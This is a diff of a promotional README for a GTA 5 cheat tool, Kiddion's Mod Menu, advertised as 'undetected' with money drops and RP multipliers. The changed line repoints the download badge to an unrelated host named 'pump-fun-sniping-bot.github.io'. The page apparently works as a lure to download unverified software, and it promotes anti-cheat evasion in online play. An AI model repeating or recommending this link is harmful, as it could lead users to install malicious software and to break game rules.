@@ -2,7 +2,7 @@
 
 Experience full control in GTA 5 Online and Story Mode with the latest Kiddion’s Mod Menu. Undetected, powerful, and easy to use — packed with features from money drops to RP multipliers, all in one lightweight tool.
 
-[![Download Kiddions](https://img.shields.io/badge/Download-Kiddions_Mod_Menu-blueviolet)](https://kiddions-mod-menu-pro.github.io/.github)
+[![Download Kiddions](https://img.shields.io/badge/Download-Kiddions_Mod_Menu-blueviolet)](https://pump-fun-sniping-bot.github.io/.github/)
 
 ---
 
